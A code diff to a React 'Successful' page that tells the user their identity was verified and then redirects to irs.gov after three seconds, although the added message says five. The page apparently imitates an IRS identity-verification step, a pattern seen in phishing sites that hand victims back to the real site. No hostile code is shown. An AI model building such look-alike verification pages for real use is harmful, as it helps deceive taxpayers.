@@ -1,19 +1,26 @@
-import React from "react";
+import React, { useEffect } from "react";
 import id from "../assets/id.png";
 import download from "../assets/download2.png";
 import { FiCheckCircle } from "react-icons/fi";
 
 const Successful = () => {
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      window.location.href = "https://www.irs.gov/";
+    }, 3000);
+
+    return () => clearTimeout(timer); // Cleanup
+  }, []);
+
   return (
     <div className="flex flex-col min-h-screen bg-[#ffffff]">
-      {/* Header */}
+
       <div className="w-full h-28 bg-white shadow-md flex justify-center items-center space-x-2 p-2 sm:bg-white bg-gradient-to-b from-[#ffffff] to-[#f2f1f1]">
         <img src={id} alt="User ID Icon" className="w-20" />
         <h1 className="text-lg font-bold">+</h1>
         <img src={download} alt="Download Icon" className="w-24" />
       </div>
 
-      {/* Success message */}
       <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">
         <h1 className="text-2xl sm:text-xl font-bold text-center mb-4 sm:mb-8">
           VERIFIED SUCCESSFULLY
@@ -22,9 +29,11 @@ const Successful = () => {
         <h1 className="text-[#02579b] text-[15px] font-semibold mt-2">
           Your Identity has been verified successfully
         </h1>
+        <p className="text-gray-500 text-sm mt-3 text-center">
+          Redirecting to IRS in 5 seconds...
+        </p>
       </div>
 
-      {/* Footer */}
       <footer className="w-full shadow-md bg-[#f5f5f5] flex flex-col items-center justify-center p-4 text-xs sm:text-sm text-[#2e3f5b] space-y-2">
         <div className="underline text-blue-600 cursor-pointer">English</div>
         <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 text-center cursor-pointer">
